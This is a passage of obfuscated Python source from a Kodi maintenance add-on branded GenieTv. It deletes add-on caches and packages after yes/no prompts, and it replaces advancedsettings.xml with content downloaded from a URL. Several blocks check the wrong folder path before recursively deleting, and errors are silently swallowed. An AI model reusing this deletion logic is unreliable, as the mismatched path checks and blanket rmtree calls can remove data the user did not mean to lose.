    if i1iiIIiiI111 . yesno ( "Delete KODI Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 65 - 65: Ooo0OO0oOO * Ooo0OO0oOO / OOoo0OO0 + Ooo0OO0oOO % oOO + I1IiI
     for oO00oo0o00o0o in i1oO0OO0 :
      try :
       os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
      except :
       pass
     for O0Oo0o000oO in iiIi1IIiI :
      try :
       shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      except :
       pass
       if 92 - 92: OOooOOo
   else :
    pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  ii111Ii1i = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  if 46 - 46: i1IIi - II1i1IiiIIi11 + I1I1ii + Ooo00oOo00o + OOoo0OO0
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( ii111Ii1i ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 45 - 45: OOOo0 + OOoo0OO0 + i1IIi
   if O0Oo0oO0OO0 > 0 :
    if 22 - 22: iI1Ii11iII1 / i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( O0Oo0oO0OO0 ) + " files found in 'Other'" , "Do you want to delete them?" ) :
     if 62 - 62: oO0O - Ooo0OO0oOO + iIii1I11I1II1 / i11i1 . II1i1IiiIIi11 / oO0O
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 63 - 63: i1IIi
   else :
    pass
  oOoO0O = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  if 67 - 67: ii11ii1ii % OoooooooOO
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( oOoO0O ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 41 - 41: Ooo00oOo00o / iI1Ii11iII1 + I1I1ii . I1I1ii / Ooo0OO0oOO
   if O0Oo0oO0OO0 > 0 :
    if 74 - 74: oO0O % i11iIiiIii . O0 * OOOo0 * i1IIi * OoooooooOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( O0Oo0oO0OO0 ) + " files found in 'LocalAndRental'" , "Do you want to delete them?" ) :
     if 22 - 22: I1I1ii + II1i1IiiIIi11 - OOoo0OO0 + iIii1I11I1II1 / I1I1ii - OoooooooOO
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 42 - 42: OoooooooOO - I1IiI - i11i1 * I1I1ii
   else :
    pass
    if 98 - 98: Ooo00oOo00o . iIii1I11I1II1 % Oo + OoooooooOO
    if 2 - 2: I1I1ii % OoooooooOO - oOO * ii11ii1ii * iI1Ii11iII1
    if 99 - 99: iIii1I11I1II1 . Oo / oOO . i11i1 % OOOo0 * OOoo0OO0
    if 95 - 95: Ooo0OO0oOO
 oOo0ooO0O0oo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( oOo0ooO0O0oo ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( oOo0ooO0O0oo ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 31 - 31: i11iIiiIii + oO0O % I1IiI
   if 9 - 9: oOO . OOoo0OO0 - Oo . I1I1ii
   if O0Oo0oO0OO0 > 0 :
    if 39 - 39: i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete WTF Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 70 - 70: iI1Ii11iII1 % Ooo00oOo00o % OOOo0
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 95 - 95: I1IiI - I1I1ii / O0 * OOOo0 - OOooOOo
   else :
    pass
    if 12 - 12: iIii1I11I1II1 % Oo . II1i1IiiIIi11 . iI1Ii11iII1 % i11iIiiIii
    if 2 - 2: Ooo0OO0oOO * Ooo0OO0oOO . I1IiI * oO0O * iIii1I11I1II1
 I1ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.4od/cache' ) , '' )
 if os . path . exists ( I1ii ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( I1ii ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 96 - 96: oO0O
   if 24 - 24: O0
   if O0Oo0oO0OO0 > 0 :
    if 33 - 33: OoooooooOO + Ooo0OO0oOO * OoOoOO00 / i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete 4oD Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 87 - 87: OoooooooOO
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 1 - 1: iIii1I11I1II1 / OOooOOo
   else :
    pass
    if 98 - 98: O0 % OOOo0 / OoooooooOO * ii11ii1ii - Ooo0OO0oOO
    if 51 - 51: II1i1IiiIIi11 + OOoo0OO0
 Oo0ooO0O0o00o = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( Oo0ooO0O0o00o ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( Oo0ooO0O0o00o ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 75 - 75: ii11ii1ii
   if 92 - 92: i11i1 % OoOoOO00 . II1i1IiiIIi11
   if O0Oo0oO0OO0 > 0 :
    if 46 - 46: I1IiI + OOOo0 % OoooooooOO * i11iIiiIii - Oo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete BBC iPlayer Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 47 - 47: II1i1IiiIIi11 * I1IiI * iI1Ii11iII1
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 46 - 46: oO0O
   else :
    pass
    if 42 - 42: iIii1I11I1II1
    if 32 - 32: Oo - oO0O . OoooooooOO - OoooooooOO - Oo . iIii1I11I1II1
    if 34 - 34: Oo
 IiI1I1i1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( IiI1I1i1 ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( IiI1I1i1 ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 6 - 6: OOOo0 . OoOoOO00 + I1I1ii / Ooo00oOo00o % OOOo0 . OoooooooOO
   if 64 - 64: iIii1I11I1II1 + OoOoOO00 . II1i1IiiIIi11 % Oo * oOO
   if O0Oo0oO0OO0 > 0 :
    if 7 - 7: i1IIi + i1IIi / iI1Ii11iII1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Simple Downloader Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 32 - 32: oO0O * ii11ii1ii - OoooooooOO / OOOo0 . oOO - i1IIi
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 60 - 60: I1IiI % I1IiI
   else :
    pass
    if 2 - 2: oO0O . O0 - Ooo0OO0oOO + iI1Ii11iII1
    if 96 - 96: oO0O + oO0O
 iiiIi1Iiii1I = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( iiiIi1Iiii1I ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 54 - 54: oOO - iIii1I11I1II1 - OOoo0OO0 % oO0O / OoOoOO00
   if 80 - 80: i11iIiiIii % iIii1I11I1II1 / i11iIiiIii
   if O0Oo0oO0OO0 > 0 :
    if 66 - 66: I1IiI . iIii1I11I1II1 * ii11ii1ii - oO0O - iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ITV Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 28 - 28: I1IiI % OoooooooOO
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 13 - 13: iI1Ii11iII1 . Oo - OOoo0OO0 / Ooo0OO0oOO - Oo - OOOo0
   else :
    pass
    if 84 - 84: OoOoOO00
    if 57 - 57: O0 * iIii1I11I1II1 % O0 . OoooooooOO
 O00OIIIIIi1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.movies4me/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( O00OIIIIIi1 ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 82 - 82: I1I1ii . i1IIi / Ooo0OO0oOO
   if 56 - 56: II1i1IiiIIi11
   if O0Oo0oO0OO0 > 0 :
    if 23 - 23: i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Movies4me Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 24 - 24: iI1Ii11iII1
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 51 - 51: i11i1 % i11iIiiIii
   else :
    pass
    if 77 - 77: i11i1 % i11iIiiIii - ii11ii1ii
    if 21 - 21: OOoo0OO0 . Oo - OoooooooOO * i1IIi
 OoOOooOOoo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( OoOOooOOoo ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 12 - 12: Ooo0OO0oOO . i11i1
   if 52 - 52: i11iIiiIii / OOoo0OO0 % iI1Ii11iII1
   if O0Oo0oO0OO0 > 0 :
    if 21 - 21: II1i1IiiIIi11 % iI1Ii11iII1 % Oo % O0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Phoenix Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 63 - 63: OoOoOO00 * OOOo0 - OoooooooOO / OOOo0
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 50 - 50: I1IiI % oO0O + I1IiI * oO0O - i11i1
   else :
    pass
    if 94 - 94: iIii1I11I1II1
    if 1 - 1: O0
 iIOOO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.spotitube/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( iIOOO ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 98 - 98: OoOoOO00 + OoOoOO00 - iIii1I11I1II1 . I1IiI . I1I1ii
   if 99 - 99: Ooo0OO0oOO . oO0O * I1I1ii * iIii1I11I1II1 / I1IiI % iI1Ii11iII1
   if O0Oo0oO0OO0 > 0 :
    if 70 - 70: ii11ii1ii . O0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Music Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 70 - 70: Oo + i11iIiiIii
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 44 - 44: i11iIiiIii / i11i1 * oOO
   else :
    pass
    if 88 - 88: i1IIi % i11i1 / OoooooooOO * II1i1IiiIIi11 % oOO
    if 5 - 5: ii11ii1ii * oO0O % OOoo0OO0 % OoOoOO00
 iII11IiIIII = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.supercartoons/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( iII11IiIIII ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 99 - 99: i11i1 . i11i1 * oOO + OoOoOO00 . iIii1I11I1II1
   if 93 - 93: OOooOOo + iI1Ii11iII1 % I1I1ii + oOO
   if O0Oo0oO0OO0 > 0 :
    if 15 - 15: OOoo0OO0 - ii11ii1ii * oOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete SuperCartoons Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 80 - 80: II1i1IiiIIi11 + oOO * OOooOOo - OoOoOO00 - ii11ii1ii
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 95 - 95: oO0O % OOOo0 + Oo * OOooOOo * II1i1IiiIIi11
   else :
    pass
    if 22 - 22: oO0O + Ooo0OO0oOO . I1IiI
    if 84 - 84: i11iIiiIii / OOooOOo % iIii1I11I1II1 . oOO . Ooo00oOo00o / II1i1IiiIIi11
 ooooo0oo0OO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.tvonline.cc/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( ooooo0oo0OO ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 41 - 41: Oo / Ooo00oOo00o / I1IiI - i11iIiiIii - I1IiI
   if 4 - 4: OOoo0OO0 . iI1Ii11iII1
   if O0Oo0oO0OO0 > 0 :
    if 39 - 39: i11i1 . Oo - I1IiI * i11iIiiIii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete TVonline Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 4 - 4: I1IiI * O0 - OOoo0OO0
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 72 - 72: OOoo0OO0 + oOO / OOOo0 . iI1Ii11iII1 % Ooo00oOo00o / i11iIiiIii
   else :
    pass
    if 13 - 13: I1I1ii % OOooOOo + i11i1 + I1I1ii + i11iIiiIii - ii11ii1ii
    if 70 - 70: OoOoOO00 * OoOoOO00 . OOOo0
 iiIi1111iiI1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.youtube/kodion' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( iiIi1111iiI1 ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 85 - 85: OOoo0OO0 + I1I1ii
   if 11 - 11: OOoo0OO0
   if O0Oo0oO0OO0 > 0 :
    if 95 - 95: Oo + i11iIiiIii % i11i1 - Ooo0OO0oOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 11 - 11: ii11ii1ii / O0 + OoOoOO00
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
      if 95 - 95: I1I1ii + iI1Ii11iII1 * iIii1I11I1II1
   else :
    pass
    if 17 - 17: Ooo00oOo00o - Oo * O0 / oO0O
    if 19 - 19: i1IIi - iIii1I11I1II1 . OOoo0OO0
    if 2 - 2: oO0O
 Ii1i111iI = xbmc . translatePath ( 'special://masterprofile/addon_data/plugin.video.genesis' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 try :
  if i1iiIIiiI111 . yesno ( "Delete Genesis Cache Files" , "Do you want to delete cache" ) :
   iII1ii = os . path . join ( Ii1i111iI , "cache.db" )
   os . unlink ( iII1ii )
   if 51 - 51: OOooOOo . ii11ii1ii * oO0O / Oo * OoOoOO00 / O0
 except :
  pass
  if 44 - 44: i11iIiiIii % I1I1ii % Ooo0OO0oOO + OOoo0OO0 * Ooo0OO0oOO . oO0O
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "                               Finished Deleting Cache " , "                          [COLOR gold]Brought To You By GenieTv[/COLOR]" )
 if 89 - 89: OoooooooOO % OoOoOO00 - Ooo00oOo00o % i11iIiiIii
 if 7 - 7: iI1Ii11iII1
 if 15 - 15: Oo + II1i1IiiIIi11 + OOOo0 * OOooOOo
 if 33 - 33: OOooOOo * Oo
 if 88 - 88: I1I1ii % i11i1 - I1IiI - I1IiI . OOOo0
 if 52 - 52: OoOoOO00 / OoOoOO00 / OOOo0 - I1I1ii
 if 91 - 91: OOOo0 + OOooOOo % OoOoOO00 + Ooo00oOo00o
 if 66 - 66: iIii1I11I1II1 * OoOoOO00 % Oo % OOOo0 - oO0O
 if 59 - 59: iI1Ii11iII1 % Ooo0OO0oOO
def IiIIiIiIIiI ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1ii11I1IiI = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( I1ii11I1IiI ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 20 - 20: Ooo00oOo00o
   if 99 - 99: Oo + OoooooooOO . II1i1IiiIIi11 + O0
   if O0Oo0oO0OO0 > 0 :
    if 85 - 85: OoOoOO00 - oO0O
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 93 - 93: iI1Ii11iII1 / i11iIiiIii - Ooo0OO0oOO + Ooo00oOo00o / i1IIi
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 62 - 62: ii11ii1ii / OoooooooOO * OOOo0 - i1IIi
 if 81 - 81: Ooo0OO0oOO / O0 * oOO % I1IiI / O0
 if 85 - 85: OoooooooOO + OoooooooOO
 if 23 - 23: i1IIi
 if 31 - 31: Oo - iIii1I11I1II1 / OOoo0OO0 . Ooo00oOo00o
 if 74 - 74: Oo - OoOoOO00 - iI1Ii11iII1
 if 50 - 50: OOOo0 - Ooo0OO0oOO + Ooo0OO0oOO * OOoo0OO0 + Ooo0OO0oOO
 if 70 - 70: i1IIi % Ooo00oOo00o / i1IIi
 if 30 - 30: I1IiI - i11iIiiIii
def oO0OOOO00o ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1ii11I1IiI = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( I1ii11I1IiI ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 26 - 26: oOO + I1IiI
   if 17 - 17: ii11ii1ii - II1i1IiiIIi11 % Oo * O0 % O0 * i11i1
   if O0Oo0oO0OO0 > 0 :
    if 6 - 6: I1I1ii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( O0Oo0oO0OO0 ) + " files found" , "Do you want to delete them?" ) :
     if 46 - 46: OoOoOO00 * I1I1ii
     for oO00oo0o00o0o in i1oO0OO0 :
      os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
     for O0Oo0o000oO in iiIi1IIiI :
      shutil . rmtree ( os . path . join ( OooO0oOo , O0Oo0o000oO ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 oOoOo00oo ( url )
 if 23 - 23: i1IIi - O0
 if 6 - 6: oOO % OoooooooOO * I1I1ii - iI1Ii11iII1
 if 24 - 24: OOoo0OO0 / iIii1I11I1II1 . OoooooooOO % I1IiI . oO0O
 if 73 - 73: I1I1ii
 if 25 - 25: iI1Ii11iII1
 if 77 - 77: OOooOOo . iIii1I11I1II1 . OoooooooOO . iIii1I11I1II1
 if 87 - 87: OoOoOO00 - OoooooooOO / i1IIi . oO0O - Oo . i11iIiiIii
 if 47 - 47: Oo % Ooo00oOo00o - oOO - Oo * Ooo0OO0oOO
 if 72 - 72: OOooOOo % OOooOOo + II1i1IiiIIi11 + ii11ii1ii / Oo
def IIIiii ( url , name ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1IIi11 = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml.bak' )
 if os . path . exists ( i1IIi11 ) == False :
  if i1iiIIiiI111 . yesno ( "Back Up Original" , 'Have You Backed Up Your Original?' , '' , "[B][COLOR red]     AS YOU CANNOT GO BACK !!![/B][/COLOR]" ) :
   print '###' + o0oOoO00o + ' - ADVANCED XML###'
   O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
   I11OoooO = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml' )
   try :
    os . remove ( I11OoooO )
    print '=== GenieTv - REMOVING    ' + str ( I11OoooO ) + '    ==='
   except :
    pass
   iii1 = i1 . http_GET ( url ) . content
   IiIIIIIi = open ( I11OoooO , "w" )
   IiIIIIIi . write ( iii1 )
   IiIIIIIi . close ( )
   print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 else :
  print '###' + o0oOoO00o + ' - ADVANCED XML###'
  O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
  I11OoooO = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml' )
  try :
   os . remove ( I11OoooO )
   print '=== GenieTv - REMOVING    ' + str ( I11OoooO ) + '    ==='
  except :
   pass
  iii1 = i1 . http_GET ( url ) . content
  IiIIIIIi = open ( I11OoooO , "w" )
  IiIIIIIi . write ( iii1 )
  IiIIIIIi . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 return
 if 93 - 93: I1IiI . Oo
def oOOO00OOo ( url , name ) :
 print '###' + o0oOoO00o + ' - CHECK ADVANCE XML###'
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml' )
 try :
  IiIIIIIi = open ( I11OoooO ) . read ( )
  if 'zero' in IiIIIIIi :
   name = '0CACHE'
  elif 'tuxen' in IiIIIIIi :
   name = 'TUXENS'
  elif 'muckys' in IiIIIIIi :
   name = 'MUCKYS'
  elif 'p2p1' in IiIIIIIi :
   name = '1st P2P RECOMMENDED'
  elif 'p2p2' in IiIIIIIi :
   name = '2nd P2P RECOMMENDED'
  elif 'mikey' in IiIIIIIi :
   name = 'MIKEY1234'
 except :
  name = "NO ADVANCED"
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( o0oOoO00o , "[COLOR yellow]YOU HAVE[/COLOR] " + name + "[COLOR yellow] XML SETTINGS SETUP[/COLOR]" )
 return
 if 93 - 93: oOO
def IiiIi ( url ) :
 print '###' + o0oOoO00o + ' - DELETING ADVANCE XML###'
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( O00OoOO0oo0 , 'advancedsettings.xml' )
 try :
  os . remove ( I11OoooO )
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  print '=== GenieTv - DELETING    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Remove Advanced Settings Sucessfull" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       No Advanced Settings To Remove" )
 return
 if 41 - 41: Ooo0OO0oOO + O0 / iIii1I11I1II1 - I1IiI + oO0O
 if 4 - 4: ii11ii1ii % oOO . Oo * Ooo00oOo00o - OOoo0OO0
 if 27 - 27: I1I1ii
 if 10 - 10: i11iIiiIii + oOO / OoooooooOO
 if 57 - 57: OoooooooOO % OoOoOO00 - I1I1ii
 if 1 - 1: iI1Ii11iII1
 if 27 - 27: I1IiI . I1I1ii * I1IiI
 if 8 - 8: Ooo0OO0oOO * iI1Ii11iII1 * oOO
 if 26 - 26: II1i1IiiIIi11 * i11i1 / i11i1 - II1i1IiiIIi11
 if 59 - 59: oO0O % II1i1IiiIIi11 / OoOoOO00 + OOOo0 * oOO
def o0o0O0o0O ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 IiI11iII1 = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( i1 . http_GET ( url ) . content )
 for iI1IiiiI , o0O0oiii1I1II1iIii , iioOo00O0o , iI11IIi1iiI1I in IiI11iII1 :
